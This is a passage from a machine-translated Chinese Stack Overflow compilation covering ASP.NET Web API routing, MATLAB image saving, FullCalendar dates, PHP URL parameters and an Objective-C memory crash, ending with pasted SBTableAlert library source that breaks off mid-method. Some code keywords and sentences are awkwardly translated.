    // get: /api/grantees/{id}
    public GranteeModel Get(int granteeId)
    {
        Grantee grantee = ... // find grantee by Id
        if (grantee == null)
        {
            throw new HttpResponseException(HttpStatusCode.NotFound);
        }
        return new GranteeModel(grantee);
    }
} 
```

现在的问题 - 如果我尝试向 请求`http://myapp/api/grantees/123`，我得到一个 404 并且我 100% 肯定 404**不是**来自我的 Get 方法。一方面，我尝试过在该方法中调试和记录，但该方法实际上从未被命中。此外，请求的实际输出 (json) 如下所示：

```
{ 
  "Message": "No HTTP resource was found that matches the request URI 'http://myapp/api/grantees/25'.",
  "MessageDetail": "No action was found on the controller 'Grantees' that matches the request."
} 
```

此外，我的 TraceWriter 日志的输出如下所示：

```
;;http://myapp/api/grantees/10
DefaultHttpControllerSelector;SelectController;Route='controller:grantees,id:10'
DefaultHttpControllerSelector;SelectController;Grantees
HttpControllerDescriptor;CreateController;
DefaultHttpControllerActivator;Create;
DefaultHttpControllerActivator;Create;MyApp.Areas.Api.Controllers.GranteesController
HttpControllerDescriptor;CreateController;MyApp.Areas.Api.Controllers.GranteesController
GranteesController;ExecuteAsync;
ApiControllerActionSelector;SelectAction;
DefaultContentNegotiator;Negotiate;Type='HttpError', formatters=[JsonMediaTypeFormatterTracer... 
```

所以我的请求被正确路由 - 选择了正确的控制器，并且 Id 属性设置正确（10）。但是，`ApiControllerActionSelector`没有在控制器上找到匹配的方法。我也尝试将`[HttpGet]`属性添加到我的 Get 方法中，但没有成功。

有人对这里可能发生的事情有任何想法吗？我一生都无法弄清楚为什么动作选择器没有找到正确的动作。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-27T17:04:48.100

GranteesController 的 action 上的参数名称需要从 'granteeId' 修改为 'id'：

公共 GranteeModel 获取（int **id**）

# image - 在 Matlab 中保存图像输出

> ID：12146112
> 
> 赞同：3
> 
> 时间：2012-08-27T16:48:11.487
> 
> 标签：image, matlab, save

我正在使用 imagesc 来获取完整的图像。但是，我只能设法显示它，然后我必须手动保存它，我找不到使用 imwrite 或 imsave 从脚本中保存图像的方法。有可能吗？

编码：

```
image='C:\image.jpg';
in1= imread((image));
in=rgb2gray(in1);
in_in= cumsum(cumsum(double(in)), 2);
figure, imagesc(in_in); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-27T18:01:11.367

您也可以使用*打印*命令。例如，如果您正在运行多个图像并想要序列化它们并保存它们，您可以执行以下操作：

```
% Create a new figure
figure (fig_ct)
% Plot your figure

% save the figure to your working directory
eval(['print -djpeg99 '  num2str(fig_ct)]);
% increment the counter for the next figure
fig_ct = fig_ct+1; 
```

哪里`fig_ct`只是一个柜台。如果您有兴趣以不同于 jpeg 的另一种格式保存它，请查看文档，您可以使用 tiff、eps 等等。

希望这可以帮助

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-27T17:31:34.287

我相信您的问题可能在于您正在保存一个不在 [0 1] 范围内的双矩阵。如果您阅读[文档](http://www.mathworks.co.uk/help/techdoc/ref/imwrite.html)，您会看到

> 如果输入数组是 double 类，并且图像是灰度或 RGB 彩色图像，则 imwrite 假定动态范围为 [0,1] 并在将数据作为 8 位值写入文件之前自动将数据缩放 255。

您可以自己将其转换为受支持的类型（即逻辑、uint8、uint16 或双精度），或者通过例如将其除以最大值将其置于 [0 1] 范围内：

```
imwrite (in_in / max (in_in(:)), 'out.jpg'); 
```

您可能仍想进一步增加您保存的图像的动态范围。例如，在除以最大值之前减去最小值。

```
in_in = in_in - min (in_in(:));
in_in = in_in / max (in_in(:));
imwrite (in_in, 'out.jpg'); 
```

如果您想要确切`imagesc`显示的内容

> 该`imagesc`函数将图像数据缩放到当前颜色图的整个范围。

我不知道它到底是什么意思，但调用 imagesc 请求 1 个变量，并检查图像句柄以查看颜色图并将其传递给`imwrite()`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-22T01:33:02.913

我是一个非常新的程序员，所以如果这不是很有帮助，请提前道歉，但我只是遇到了同样的问题并设法解决了。我使用 uint8 像这样转换它：

```
imwrite(uint8(in_in), 'in_in.jpg', 'jpg'); 
```

# javascript - 全日历中针对特定日期的 DayClick 事件警报

> ID：12146114
> 
> 赞同：0
> 
> 时间：2012-08-27T16:48:25.450
> 
> 标签：javascript, fullcalendar

当用户在 Fullcalendar dayClick 事件中单击月视图中的日槽时，我希望收到一条警报，指出此特定日期不可用，例如劳动节假期。

我写了这段代码，但它不起作用，我需要有人帮我理解这里有什么问题：

```
 dayClick: function (date, allDay, jsEvent, view) {   
    var myDate=new Date();
    myDate.setFullYear(2012,09,02);

    if (date == myDate){
        alert('Labor Day Weekend. No reservations available'); 
        $(this).css('background-color', 'red');
        return false; 
```

此外，“红色”插槽适用于这个“被封锁”的日子，但是当我点击日历上的另一天时，它也会变成红色。这里有什么问题？请帮忙！非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:21:50.743

有几件事：

1.  日期中的月份是从 0 开始的。这意味着`myDate.setFullYear(2012,09,02)`将日期设置为 2012 年 10 月 2 日。我认为您试图将其设置为 9 月 2 日 - 在这种情况下，您需要使用`myDate.setFullYear(2012,08,02)`.
2.  当您这样做时`new Date()`，它会使用当前日期和时间创建一个日期。当你这样做时，`date.setFullYear()`它只会覆盖日期 - 而不是时间。这可能会导致比较问题。我一直习惯于`new Date(2012, 9, 2, 0, 0, 0, 0)`简单地这样做。
3.  最后，我认为这是导致您问题的原因，`==`操作员不适用于日期。您将需要显式使用一个`valueOf`函数来进行比较`getTime()`。有关更多详细信息，请参阅[此答案](https://stackoverflow.com/a/7244560/1183042)。

我为你总结了所有这些 - [http://jsfiddle.net/100thGear/sStbC/](http://jsfiddle.net/100thGear/sStbC/)

让我知道这是否有帮助！

# android - 使用原生 android 代码通过 audioflinger 播放声音文件

> ID：12146117
> 
> 赞同：3
> 
> 时间：2012-08-27T16:48:46.360
> 
> 标签：android, audio, audioflinger

这正是我想要的。我想知道如何编写一个能够直接访问android中的audio-flinger的C代码。当然，audio-flinger 会导出一些接口。我认为可能有一个 libaudio.so 我将包含在我的编译中，然后调用一个简单的播放函数来实现它。只需给出类似 play("filename"); 任何想法。

干杯瓦沙里

# excel - 如何根据对数量查询的回答创建一个创建行重复项的电子表格

> ID：12146121
> 
> 赞同：0
> 
> 时间：2012-08-27T16:48:55.850
> 
> 标签：excel, excel-2010, vba

我正在尝试在 Excel 2010 中创建一个电子表格，该电子表格根据对数量问题的回答创建行的重复项。

例如 - 我的问题是，“你有多少比萨饼？” 基于此响应，将出现一行获取有关比萨饼的详细信息的信息 - 该人拥有的每个比萨饼对应一行。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T18:51:13.203

您需要的 VBA 代码是`EntireRow.Insert`，因此请阅读[本文](https://stackoverflow.com/questions/2714831/inserting-rows-without-selecting-anything)以帮助您入门。应用放入特定单元格的值来量化要在相关行下方插入的行数应该相当简单。

# php - 使用额外参数更新当前 URL

> ID：12146124
> 
> 赞同：-2
> 
> 时间：2012-08-27T16:49:34.473
> 
> 标签：php, javascript, html

我有一个产品页面，每页显示 10 个产品。

`GET`变量改变结果的`&perpage=10`数量。我做了一个`<select>`下拉列表来选择不同数量的结果。

每当这个选择框被改变时，`&perpage=NEWVALUE`都应该被添加到**当前**的URL 中。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T16:54:48.337

*修改*当前 URL的唯一方法是使用主题标签 ( `#`) 和[`window.history.replaceState`](https://developer.mozilla.org/en-US/docs/DOM/window.history)，这两者实际上都不会重新加载页面。这些方法*确实*调度了您可以侦听的更改事件，并且使用 ajax 重新查询后端脚本以获取结果，但是 - 这可能比您实际需要的要多一些。

您最有可能要做的是让您的表单（使用选择菜单）将表单重新提交回当前页面。就像是：

```
<form action="" method="GET">
    <select name="perpage" onchange="this.form.submit()">
        <option value="10">10</option>
        <option value="25">25</option>
        <option value="50">50</option>
    </select>
</form> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T16:53:44.730

好吧，只是（从值`location.href += "&perpage="+newvalue`中适当定义）会起作用，但过一段时间你会得到类似的东西`newvalue``<select>`

```
http://example.com/products.php?perpage=10&perpage=20&perpage=50&perpage=10&perpage=5&perpage=20&................ 
```

所以你真的应该做更多类似的事情：

```
location.href = location.href.replace(/([?&])perpage=\d+/,"$1perpage="+newvalue); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T16:53:47.083

```
window.location.href="?perpage=NEWVALUE" 
```

这会将查询字符串附加到当前位置，并且窗口将导航到它

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T16:54:17.167

在 PHP、JavaScript 中？

```
<form method="get">
    <select name="perpage">
        <option value="10">10</option>
        <option value="20">20</option>
        <option value="30">30</option>
    </select>
</form> 
```

使用该`GET`方法会将`perpage`值发布到您的 url，它会重新加载您的页面（`action="someurl"`如果您希望它转到另一个页面，请设置您的）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-27T16:54:40.207

在不重新加载页面的情况下，您无法修改您所描述的 URL。（假设您不想重新加载页面）

请参阅[jquery：更改 URL 地址而不重定向？](https://stackoverflow.com/questions/6478485/jquery-change-the-url-address-without-redirecting)以获得更完整的解释，以及如何使用哈希做一些类似的事情。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-27T17:00:14.650

假设您正在询问如何在服务器端执行此操作（您的问题没有说明），这是执行您想要的一种方法：

```
$parts = parse_url($url); # parse the URL into its component parts
if (isset($parts['query'])) {
    parse_str($parts['query'], $qs); # split query string into parts
} else {
    $qs = array();
}
$qs['perpage'] = $NEWVALUE; # add param to array
$parts['query'] = http_build_query($qs); # build query string from array

# then, using `unparse_url()` from 
# http://www.php.net/manual/en/function.parse-url.php#106731
# you rebuild the URL:

$url = unparse_url($parts);

# For reference, here's `unparse_url()`:

function unparse_url($parsed_url) { 
  $scheme   = isset($parsed_url['scheme']) ? $parsed_url['scheme'] . '://' : '';
  $host     = isset($parsed_url['host']) ? $parsed_url['host'] : ''; 
  $port     = isset($parsed_url['port']) ? ':' . $parsed_url['port'] : ''; 
  $user     = isset($parsed_url['user']) ? $parsed_url['user'] : ''; 
  $pass     = isset($parsed_url['pass']) ? ':' . $parsed_url['pass']  : ''; 
  $pass     = ($user || $pass) ? "$pass@" : ''; 
  $path     = isset($parsed_url['path']) ? $parsed_url['path'] : ''; 
  $query    = isset($parsed_url['query']) ? '?' . $parsed_url['query'] : ''; 
  $fragment = isset($parsed_url['fragment']) ? '#' . $parsed_url['fragment'] : '';
   return "$scheme$user$pass$host$port$path$query$fragment"; 
} 
```

见[http://www.php.net/manual/en/function.parse-url.php#106731](http://www.php.net/manual/en/function.parse-url.php#106731)

# objective-c - 消息发送到释放的实例

> ID：12146126
> 
> 赞同：0
> 
> 时间：2012-08-27T16:49:50.663
> 
> 标签：objective-c, memory, nsmutablearray, memory-management

我正在尝试对程序中的内存问题进行排序。

我的程序停在这一行：

```
 label.text = [[[[self.allData objectAtIndex:indexPath.row-1]objectAtIndex:1+[[self.measurments objectAtIndex:(i-1)]intValue]]objectAtIndex:1]stringValue]; 
```

白色消息：

```
 Thread 1: EXC_BREAKPOINT 
 ** -[CFNumber stringValue]: message sent to deallocated instance 0x859add0 
```

我拥有 allData 和测量值的属性

```
@property (nonatomic, retain) NSMutableArray *allData;
@property (nonatomic, retain) NSMutableArray *measurments; 
```

我将 allData 定义为：

```
self.allData = [[[NSMutableArray alloc] init]autorelease];

self.allData = [self GetTableOfLevel:TableLevel section:TableSection perent:0 array:self._backupData]; 
```

其中 GetTableOfLevel:TableLevel 函数返回 NSMutableArray。

之后，我将 allData 保持原样，除了我将其复制为：

```
self.backupData = [[self.allData copy]autorelease]; 
```

有没有人知道它可能会出什么问题？

* * *

我尝试了建议并切换到 ARC，但我在下载库时遇到了一些问题。

我有 SBTableAlert，它看起来像：

```
 //
//  --------------------------------------------
//  Copyright (C) 2011 by Simon Blommegård
//
//  Permission is hereby granted, free of charge, to any person obtaining a copy
//  of this software and associated documentation files (the "Software"), to deal
//  in the Software without restriction, including without limitation the rights
//  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
//  copies of the Software, and to permit persons to whom the Software is
//  furnished to do so, subject to the following conditions:
//
//  The above copyright notice and this permission notice shall be included in
//  all copies or substantial portions of the Software.
//
//  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
//  THE SOFTWARE.
//  --------------------------------------------
//
//  SBTableAlert.h
//  SBTableAlert
//
//  Created by Simon Blommegård on 2011-04-08.
//  Copyright 2011 Simon Blommegård. All rights reserved.
//

#import <Foundation/Foundation.h>

#define kTableCornerRadius 5.

typedef enum {
    SBTableAlertTypeSingleSelect, // dismiss alert with button index -1 and animated (default)
    SBTableAlertTypeMultipleSelct, // dismiss handled by user eg. [alert.view dismiss...];
} SBTableAlertType;

typedef enum {
    SBTableAlertStylePlain, // plain white BG and clear FG (default)
    SBTableAlertStyleApple, // same style as apple in the alertView for slecting wifi-network (Use SBTableAlertCell)
} SBTableAlertStyle;

// use this class if you would like to use the custom section headers by yourself
@interface SBTableViewSectionHeaderView : UIView {}
@property (nonatomic, copy) NSString *title;
@end

@interface SBTableAlertCell : UITableViewCell {}
- (void)drawCellBackgroundView:(CGRect)r;
@end

@class SBTableAlert;

@protocol SBTableAlertDelegate <NSObject>
@optional

- (CGFloat)tableAlert:(SBTableAlert *)tableAlert heightForRowAtIndexPath:(NSIndexPath *)indexPath;

- (void)tableAlert:(SBTableAlert *)tableAlert didSelectRowAtIndexPath:(NSIndexPath *)indexPath;
- (void)tableAlertCancel:(SBTableAlert *)tableAlert;

- (void)tableAlert:(SBTableAlert *)tableAlert clickedButtonAtIndex:(NSInteger)buttonIndex;

- (void)willPresentTableAlert:(SBTableAlert *)tableAlert;
- (void)didPresentTableAlert:(SBTableAlert *)tableAlert;

- (void)tableAlert:(SBTableAlert *)tableAlert willDismissWithButtonIndex:(NSInteger)buttonIndex;
- (void)tableAlert:(SBTableAlert *)tableAlert didDismissWithButtonIndex:(NSInteger)buttonIndex;

@end

@protocol SBTableAlertDataSource <NSObject>
@required

- (UITableViewCell *)tableAlert:(SBTableAlert *)tableAlert cellForRowAtIndexPath:(NSIndexPath *)indexPath;
- (NSInteger)tableAlert:(SBTableAlert *)tableAlert numberOfRowsInSection:(NSInteger)section;

@optional

- (NSInteger)numberOfSectionsInTableAlert:(SBTableAlert *)tableAlert; // default 1
- (NSString *)tableAlert:(SBTableAlert *)tableAlert titleForHeaderInSection:(NSInteger)section;

@end

@interface SBTableAlert : NSObject <UITableViewDelegate, UITableViewDataSource, UIAlertViewDelegate> {}

@property (nonatomic, retain) UIAlertView *view;
@property (nonatomic, retain) UITableView *tableView;
@property (nonatomic) SBTableAlertType type;
@property (nonatomic) SBTableAlertStyle style;
@property (nonatomic) NSInteger maximumVisibleRows; // default 4, (nice in both orientations w/ rowHeigh == 40), if -1 is passed it will display the whole table.
@property (nonatomic) CGFloat rowHeight; // default 40, (default in UITableView == 44)

@property (nonatomic, assign) id <SBTableAlertDelegate> delegate;
@property (nonatomic, assign) id <SBTableAlertDataSource> dataSource;

@property (nonatomic, assign) id <UITableViewDelegate> tableViewDelegate; // default self, (set other for more advanded use)
@property (nonatomic, assign) id <UITableViewDataSource> tableViewDataSource; // default self, (set other for more advanded use)
@property (nonatomic, assign) id <UIAlertViewDelegate> alertViewDelegate; // default self, (set other for more advanded use)

- (id)initWithTitle:(NSString *)title cancelButtonTitle:(NSString *)cancelTitle messageFormat:(NSString *)message, ...;
+ (id)alertWithTitle:(NSString *)title cancelButtonTitle:(NSString *)cancelTitle messageFormat:(NSString *)message, ...;

- (void)show;

@end

    //
//  --------------------------------------------
//  Copyright (C) 2011 by Simon Blommegård
//
//  Permission is hereby granted, free of charge, to any person obtaining a copy
//  of this software and associated documentation files (the "Software"), to deal
//  in the Software without restriction, including without limitation the rights
//  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
//  copies of the Software, and to permit persons to whom the Software is
//  furnished to do so, subject to the following conditions:
//
//  The above copyright notice and this permission notice shall be included in
//  all copies or substantial portions of the Software.
//
//  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
//  THE SOFTWARE.
//  --------------------------------------------
//
//  SBTableAlert.m
//  SBTableAlert
//
//  Created by Simon Blommegård on 2011-04-08.
//  Copyright 2011 Simon Blommegård. All rights reserved.
//

#import "SBTableAlert.h"
#import <QuartzCore/QuartzCore.h>

@interface SBTableViewTopShadowView : UIView {}
@end

@implementation SBTableViewTopShadowView

- (void)drawRect:(CGRect)rect {
    [super drawRect:rect];

    CGContextRef context = UIGraphicsGetCurrentContext();

    // Draw top shadow
    CGFloat colors [] = { 
        0, 0, 0, 0.4,
        0, 0, 0, 0,
    };

    CGColorSpaceRef baseSpace = CGColorSpaceCreateDeviceRGB();
    CGGradientRef gradient = CGGradientCreateWithColorComponents(baseSpace, colors, NULL, 2);
    CGColorSpaceRelease(baseSpace), baseSpace = NULL;

    CGPoint startPoint = CGPointMake(CGRectGetMidX(self.bounds), CGRectGetMinY(self.bounds));
    CGPoint endPoint = CGPointMake(CGRectGetMidX(self.bounds), 8);

    CGContextDrawLinearGradient(context, gradient, startPoint, endPoint, 0);
    CGGradientRelease(gradient), gradient = NULL;
}

@end

@interface SBTableView : UITableView {}
@property (nonatomic) SBTableAlertStyle alertStyle;
@end

@implementation SBTableView

@synthesize alertStyle=_alertStyle;

- (void)drawRect:(CGRect)rect {
    CGContextRef context = UIGraphicsGetCurrentContext();

    if (_alertStyle == SBTableAlertStyleApple) {
        // Draw background gradient
        CGFloat colors [] = { 
            0.922, 0.925, 0.933, 1,
            0.749, 0.753, 0.761, 1,
        };

        CGColorSpaceRef baseSpace = CGColorSpaceCreateDeviceRGB();
        CGGradientRef gradient = CGGradientCreateWithColorComponents(baseSpace, colors, NULL, 2);
        CGColorSpaceRelease(baseSpace), baseSpace = NULL;

        CGPoint startPoint = CGPointMake(CGRectGetMidX(self.bounds), CGRectGetMinY(self.bounds));
        CGPoint endPoint = CGPointMake(CGRectGetMidX(self.bounds), CGRectGetMaxY(self.bounds));

        CGContextDrawLinearGradient(context, gradient, startPoint, endPoint, 0);
        CGGradientRelease(gradient), gradient = NULL;
    }

    [super drawRect:rect];
}

@end

@interface SBTableAlertCellBackgroundView : UIView
@end

@implementation SBTableAlertCellBackgroundView

- (void)drawRect:(CGRect)r {
    [(SBTableAlertCell *)[self superview] drawCellBackgroundView:r];
}

@end

@implementation SBTableViewSectionHeaderView
@synthesize title=_title;

- (id)initWithTitle:(NSString *)title {
    if ((self = [super initWithFrame:CGRectZero])) {
        [self setTitle:title];
        [self setBackgroundColor:[UIColor colorWithRed:0.165 green:0.224 blue:0.376 alpha:0.85]];
    }

    return self;
}

- (void)dealloc {
    [self setTitle:nil];
    [super dealloc];
}

- (void)drawRect:(CGRect)rect {
    [super drawRect:rect];

    CGContextRef context = UIGraphicsGetCurrentContext();

    [[UIColor colorWithWhite:0 alpha:0.8] set];
    [_title drawAtPoint:CGPointMake(10, 4) withFont:[UIFont boldSystemFontOfSize:12]];  
    [[UIColor whiteColor] set];
    [_title drawAtPoint:CGPointMake(10, 5) withFont:[UIFont boldSystemFontOfSize:12]];

    CGContextSetLineWidth(context, 1.5);

    [[UIColor colorWithWhite:1 alpha:0.35] set];
    CGContextMoveToPoint(context, 0, 0);
    CGContextAddLineToPoint(context, self.bounds.size.width, 0);
    CGContextStrokePath(context);

    [[UIColor colorWithWhite:0 alpha:0.35] set];
    CGContextMoveToPoint(context, 0, self.bounds.size.height);
    CGContextAddLineToPoint(context, self.bounds.size.width, self.bounds.size.height);
    CGContextStrokePath(context);
}

@end

@interface SBTableAlertCell ()
@property (nonatomic, retain) SBTableAlertCellBackgroundView *cellBackgroundView;
@end

@implementation SBTableAlertCell
@synthesize cellBackgroundView = _cellBackgroundView;

- (id)initWithStyle:(UITableViewCellStyle)style reuseIdentifier:(NSString *)reuseIdentifier {
    if((self = [super initWithStyle:style reuseIdentifier:reuseIdentifier])) {
        CGRect frame = CGRectMake(0.0, 0.0, self.contentView.bounds.size.width, self.contentView.bounds.size.height);

        _cellBackgroundView = [[SBTableAlertCellBackgroundView alloc] initWithFrame:frame];
        [_cellBackgroundView setBackgroundColor:[UIColor clearColor]];
        [_cellBackgroundView setAutoresizingMask:(UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight)];
        [self setBackgroundView:_cellBackgroundView];
        [_cellBackgroundView release];

        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(setNeedsDisplay) name:UIApplicationDidChangeStatusBarOrientationNotification object:nil];
    }
    return self;
}

- (void)dealloc {
    [[NSNotificationCenter defaultCenter] removeObserver:self];
    [super dealloc];
}

- (void)layoutSubviews {
    [super layoutSubviews];

    float editingOffset = 0.;
    if (self.editing)
        editingOffset = -self.contentView.frame.origin.x;

    _cellBackgroundView.frame = CGRectMake(editingOffset,
                                                                            _cellBackgroundView.frame.origin.y,
                                                                            self.frame.size.width - editingOffset,
                                                                            _cellBackgroundView.frame.size.height);

    [self.textLabel setBackgroundColor:[UIColor clearColor]];
    [self.detailTextLabel setBackgroundColor:[UIColor clearColor]];
    [self setBackgroundColor:[UIColor clearColor]];

    [self setNeedsDisplay];
}

- (void)setNeedsDisplay {
    [super setNeedsDisplay];
    [_cellBackgroundView setNeedsDisplay];
}

- (void)drawCellBackgroundView:(CGRect)r {
    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextSetLineWidth(context, 1.5);

    [[UIColor colorWithWhite:1 alpha:0.8] set];
    CGContextMoveToPoint(context, 0, 0);
    CGContextAddLineToPoint(context, self.bounds.size.width, 0);
    CGContextStrokePath(context);

    [[UIColor colorWithWhite:0 alpha:0.35] set];
    CGContextMoveToPoint(context, 0, self.bounds.size.height);
    CGContextAddLineToPoint(context, self.bounds.size.width, self.bounds.size.height);
    CGContextStrokePath(context);
}

@end

@interface SBTableAlert ()
@property (nonatomic, retain) SBTableViewTopShadowView *shadow;
@property (nonatomic, assign) BOOL presented;

- (id)initWithTitle:(NSString *)title cancelButtonTitle:(NSString *)cancelTitle messageFormat:(NSString *)format args:(va_list)args;
- (void)increaseHeightBy:(CGFloat)delta;
- (void)layout;

@end

@implementation SBTableAlert

@synthesize view=_alertView;
@synthesize tableView=_tableView;
@synthesize type=_type;
@synthesize style=_style;
@synthesize maximumVisibleRows=_maximumVisibleRows;
@synthesize rowHeight=_rowHeight;

@synthesize delegate=_delegate;
@synthesize dataSource=_dataSource;

@dynamic tableViewDelegate;
@dynamic tableViewDataSource;
@dynamic alertViewDelegate;

@synthesize shadow = _shadow;
@synthesize presented = _presented;

- (id)initWithTitle:(NSString *)title cancelButtonTitle:(NSString *)cancelTitle messageFormat:(NSString *)format args:(va_list)args {
    if ((self = [super init])) {
        NSString *message = format ? [[[NSString alloc] initWithFormat:format arguments:args] autorelease] : nil;

        _alertView = [[UIAlertView alloc] initWithTitle:title message:message delegate:self cancelButtonTitle:cancelTitle otherButtonTitles:nil];

        _maximumVisibleRows = 4;
        _rowHeight = 40.;

        _tableView = [[SBTableView alloc] initWithFrame:CGRectZero style:UITableViewStylePlain];

        [_tableView setDelegate:self];
        [_tableView setDataSource:self];
        [_tableView setBackgroundColor:[UIColor whiteColor]];
        [_tableView setRowHeight:_rowHeight];
        [_tableView setSeparatorColor:[UIColor lightGrayColor]];
        [_tableView.layer setCornerRadius:kTableCornerRadius];

        [_alertView addSubview:_tableView];

        _shadow = [[SBTableViewTopShadowView alloc] initWithFrame:CGRectZero];
        [_shadow setBackgroundColor:[UIColor clearColor]];
        [_shadow setHidden:YES];
        [_shadow.layer setCornerRadius:kTableCornerRadius];
        [_shadow.layer setMasksToBounds:YES];

        [_alertView addSubview:_shadow];
        [_alertView bringSubviewToFront:_shadow];

        [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(layoutAfterSomeTime) name:UIApplicationDidChangeStatusBarOrientationNotification object:nil];
    }

    return self;
}

- (id)initWithTitle:(NSString *)title cancelButtonTitle:(NSString *)cancelTitle messageFormat:(NSString *)message, ... {
    va_list list;
    va_start(list, message);
    self = [self initWithTitle:title cancelButtonTitle:cancelTitle messageFormat:message args:list];
    va_end(list);
    return self;
}

+ (id)alertWithTitle:(NSString *)title cancelButtonTitle:(NSString *)cancelTitle messageFormat:(NSString *)message, ... {
    return [[[SBTableAlert alloc] initWithTitle:title cancelButtonTitle:cancelTitle messageFormat:message] autorelease];
}

- (void)dealloc {
    [self setTableView:nil];
    [self setView:nil];

    [self setShadow:nil];

    [[NSNotificationCenter defaultCenter] removeObserver:self];

    [super dealloc];
}

#pragma mark -

- (void)show {
    [_tableView reloadData];
    [_alertView show];
}

#pragma mark - Properties

- (void)setStyle:(SBTableAlertStyle)style {
    if (style == SBTableAlertStyleApple) {
        [_tableView setSeparatorStyle:UITableViewCellSeparatorStyleNone];
        [(SBTableView *)_tableView setAlertStyle:SBTableAlertStyleApple];
        [_shadow setHidden:NO];
    } else if (style == SBTableAlertStylePlain) {
        [_tableView setSeparatorStyle:UITableViewCellSeparatorStyleSingleLine];
        [(SBTableView *)_tableView setAlertStyle:SBTableAlertStylePlain];
        [_shadow setHidden:YES];
    }
    _style = style;
}

- (id<UITableViewDelegate>)tableViewDelegate {
    return _tableView.delegate;
}

- (void)setTableViewDelegate:(id<UITableViewDelegate>)tableViewDelegate {
    [_tableView setDelegate:tableViewDelegate];
}

- (id<UITableViewDataSource>)tableViewDataSource {
    return _tableView.dataSource;
}

- (void)setTableViewDataSource:(id<UITableViewDataSource>)tableViewDataSource {
    [_tableView setDataSource:tableViewDataSource];
}

- (id<UIAlertViewDelegate>)alertViewDelegate {
    return _alertView.delegate;
}

- (void)setAlertViewDelegate:(id<UIAlertViewDelegate>)alertViewDelegate {
    [_alertView setDelegate:alertViewDelegate];
}

#pragma mark - Private

- (void)increaseHeightBy:(CGFloat)delta {
    CGPoint c = _alertView.center;
    CGRect r = _alertView.frame;
    r.size.height += delta;
    _alertView.frame = r;
    _alertView.center = c;
    _alertView.frame = CGRectIntegral(_alertView.frame);

    for(UIView *subview in [_alertView subviews]) {
        if([subview isKindOfClass:[UIControl class]]) {
            CGRect frame = subview.frame;
            frame.origin.y += delta;
            subview.frame = frame;
        }
    }
}

- (void)layout {
    CGFloat height = 0.;
    NSInteger rows = 0;
    for (NSInteger section = 0; section < [_tableView numberOfSections]; section++) {
        for (NSInteger row = 0; row < [_tableView numberOfRowsInSection:section]; row++) {
            height += [_tableView.delegate tableView:_tableView heightForRowAtIndexPath:[NSIndexPath indexPathForRow:row inSection:section]];
            rows ++;
        }
    }

    CGRect screenRect = [[UIScreen mainScreen] bounds];
    CGFloat avgRowHeight = height / rows;
    CGFloat resultHeigh;

    if(height > screenRect.size.height) {
        if(UIDeviceOrientationIsPortrait([UIDevice currentDevice].orientation))
            resultHeigh = screenRect.size.height - _alertView.frame.size.height - 65.;
        else
            resultHeigh = screenRect.size.width - _alertView.frame.size.height - 65.;
    }
    else if (_maximumVisibleRows == -1 || rows <= _maximumVisibleRows)
        resultHeigh = _tableView.contentSize.height;
    else
        resultHeigh = (avgRowHeight * _maximumVisibleRows);

    [self increaseHeightBy:resultHeigh];

    [_tableView setFrame:CGRectMake(12,
                                                                    _alertView.frame.size.height - resultHeigh - 65,
                                                                    _alertView.frame.size.width - 24,
                                                                    resultHeigh)];

    [_shadow setFrame:CGRectMake(_tableView.frame.origin.x,
                                                             _tableView.frame.origin.y,
                                                             _tableView.frame.size.width,
                                                             8)];
}

- (void)layoutAfterSomeTime{
    [NSTimer scheduledTimerWithTimeInterval:0.0 target:self selector:@selector(layout) userInfo:nil repeats:NO];
}

#pragma mark -
#pragma mark UITableViewDelegate

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {
    if ([_delegate respondsToSelector:@selector(tableAlert:heightForRowAtIndexPath:)])
        return [_delegate tableAlert:self heightForRowAtIndexPath:indexPath];

    return _rowHeight;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    if (_type == SBTableAlertTypeSingleSelect)
        [_alertView dismissWithClickedButtonIndex:-1 animated:YES];

    if ([_delegate respondsToSelector:@selector(tableAlert:didSelectRowAtIndexPath:)])
        [_delegate tableAlert:self didSelectRowAtIndexPath:indexPath];
}

- (UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section {
